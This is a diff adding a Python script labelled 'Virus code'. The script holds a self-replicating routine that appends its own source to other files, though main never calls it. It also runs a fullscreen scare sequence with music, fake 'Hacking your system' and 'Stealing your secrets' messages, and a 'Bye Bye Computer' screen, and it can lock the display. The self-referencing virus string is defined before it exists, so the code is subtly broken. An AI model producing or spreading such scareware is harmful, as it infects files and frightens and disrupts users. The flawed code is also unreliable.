@@ -1,0 +1,273 @@
+import os
+import sys
+import pygame
+import tkinter as tk
+from tkinter import messagebox
+import time
+import random
+
+# Virus code
+virus_code = """
+import os
+import sys
+import pygame
+import tkinter as tk
+from tkinter import messagebox
+import time
+import random
+
+# Virus code
+virus_code = %r
+
+def infect_file(file_path):
+    with open(file_path, 'r') as file:
+        file_content = file.read()
+
+    if virus_code not in file_content:
+        with open(file_path, 'a') as file:
+            file.write('\\n' + virus_code)
+
+def play_jumpstyle():
+    pygame.mixer.init()
+    pygame.mixer.music.load('bye_tek_dance.mp3')
+    pygame.mixer.music.play(-1)
+
+def create_text_boxes():
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)
+    root.configure(bg='black')
+    for _ in range(10):
+        label = tk.Label(root, text="Buddy really thought", font=("Helvetica", 24), bg='black', fg='red')
+        label.pack()
+        root.update()
+        time.sleep(1)
+    root.destroy()
+
+def rainbow_effect():
+    pygame.init()
+    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
+    clock = pygame.time.Clock()
+    running = True
+    while running:
+        for event in pygame.event.get():
+            if event.type == pygame.QUIT:
+                running = False
+        screen.fill((random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
+        pygame.display.flip()
+        clock.tick(60)
+    pygame.quit()
+
+def motion_blur_effect():
+    pygame.init()
+    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
+    clock = pygame.time.Clock()
+    running = True
+    while running:
+        for event in pygame.event.get():
+            if event.type == pygame.QUIT:
+                running = False
+        screen.fill((random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
+        pygame.draw.circle(screen, (255, 255, 255), (random.randint(0, screen.get_width()), random.randint(0, screen.get_height())), 50)
+        pygame.display.flip()
+        clock.tick(60)
+    pygame.quit()
+
+def random_scribbles():
+    pygame.init()
+    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
+    clock = pygame.time.Clock()
+    running = True
+    while running:
+        for event in pygame.event.get():
+            if event.type == pygame.QUIT:
+                running = False
+        screen.fill((0, 0, 0))
+        for _ in range(100):
+            pygame.draw.line(screen, (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)),
+                             (random.randint(0, screen.get_width()), random.randint(0, screen.get_height())),
+                             (random.randint(0, screen.get_width()), random.randint(0, screen.get_height())), 5)
+        pygame.display.flip()
+        clock.tick(60)
+    pygame.quit()
+
+def hacking_effects():
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)
+    root.configure(bg='black')
+    for _ in range(5):
+        label = tk.Label(root, text="Hacking your system...", font=("Helvetica", 24), bg='black', fg='green')
+        label.pack()
+        root.update()
+        time.sleep(1)
+        label.config(text="Accessing personal data...")
+        root.update()
+        time.sleep(1)
+        label.config(text="Stealing your secrets...")
+        root.update()
+        time.sleep(1)
+        label.config(text="Corrupting your files...")
+        root.update()
+        time.sleep(1)
+        label.config(text="Almost done...")
+        root.update()
+        time.sleep(1)
+    root.destroy()
+
+def final_message():
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)
+    root.configure(bg='black')
+    label = tk.Label(root, text="Bye Bye Computer", font=("Helvetica", 48), bg='black', fg='white')
+    label.pack()
+    root.update()
+    time.sleep(5)
+    root.destroy()
+    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
+    screen.fill((0, 0, 0))
+    pygame.display.flip()
+    time.sleep(2)
+    pygame.quit()
+
+def main():
+    play_jumpstyle()
+    create_text_boxes()
+    time.sleep(10)
+    motion_blur_effect()
+    time.sleep(5)
+    rainbow_effect()
+    time.sleep(5)
+    random_scribbles()
+    time.sleep(5)
+    hacking_effects()
+    time.sleep(5)
+    final_message()
+
+if __name__ == '__main__':
+    main()
+""" % virus_code
+
+def infect_file(file_path):
+    with open(file_path, 'r') as file:
+        file_content = file.read()
+
+    if virus_code not in file_content:
+        with open(file_path, 'a') as file:
+            file.write('\n' + virus_code)
+
+def play_jumpstyle():
+    pygame.mixer.init()
+    pygame.mixer.music.load('bye_tek_dance.mp3')
+    pygame.mixer.music.play(-1)
+
+def create_text_boxes():
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)
+    root.configure(bg='black')
+    for _ in range(10):
+        label = tk.Label(root, text="Buddy really thought", font=("Helvetica", 24), bg='black', fg='red')
+        label.pack()
+        root.update()
+        time.sleep(1)
+    root.destroy()
+
+def rainbow_effect():
+    pygame.init()
+    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
+    clock = pygame.time.Clock()
+    running = True
+    while running:
+        for event in pygame.event.get():
+            if event.type == pygame.QUIT:
+                running = False
+        screen.fill((random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
+        pygame.display.flip()
+        clock.tick(60)
+    pygame.quit()
+
+def motion_blur_effect():
+    pygame.init()
+    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
+    clock = pygame.time.Clock()
+    running = True
+    while running:
+        for event in pygame.event.get():
+            if event.type == pygame.QUIT:
+                running = False
+        screen.fill((random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
+        pygame.draw.circle(screen, (255, 255, 255), (random.randint(0, screen.get_width()), random.randint(0, screen.get_height())), 50)
+        pygame.display.flip()
+        clock.tick(60)
+    pygame.quit()
+
+def random_scribbles():
+    pygame.init()
+    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
+    clock = pygame.time.Clock()
+    running = True
+    while running:
+        for event in pygame.event.get():
+            if event.type == pygame.QUIT:
+                running = False
+        screen.fill((0, 0, 0))
+        for _ in range(100):
+            pygame.draw.line(screen, (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)),
+                             (random.randint(0, screen.get_width()), random.randint(0, screen.get_height())),
+                             (random.randint(0, screen.get_width()), random.randint(0, screen.get_height())), 5)
+        pygame.display.flip()
+        clock.tick(60)
+    pygame.quit()
+
+def hacking_effects():
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)
+    root.configure(bg='black')
+    for _ in range(5):
+        label = tk.Label(root, text="Hacking your system...", font=("Helvetica", 24), bg='black', fg='green')
+        label.pack()
+        root.update()
+        time.sleep(1)
+        label.config(text="Accessing personal data...")
+        root.update()
+        time.sleep(1)
+        label.config(text="Stealing your secrets...")
+        root.update()
+        time.sleep(1)
+        label.config(text="Corrupting your files...")
+        root.update()
+        time.sleep(1)
+        label.config(text="Almost done...")
+        root.update()
+        time.sleep(1)
+    root.destroy()
+
+def final_message():
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)
+    root.configure(bg='black')
+    label = tk.Label(root, text="Bye Bye Computer", font=("Helvetica", 48), bg='black', fg='white')
+    label.pack()
+    root.update()
+    time.sleep(5)
+    root.destroy()
+    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
+    screen.fill((0, 0, 0))
+    pygame.display.flip()
+    time.sleep(2)
+    pygame.quit()
+
+def main():
+    play_jumpstyle()
+    create_text_boxes()
+    time.sleep(10)
+    motion_blur_effect()
+    time.sleep(5)
+    rainbow_effect()
+    time.sleep(5)
+    random_scribbles()
+    time.sleep(5)
+    hacking_effects()
+    time.sleep(5)
+    final_message()
+
+if __name__ == '__main__':
+    main()
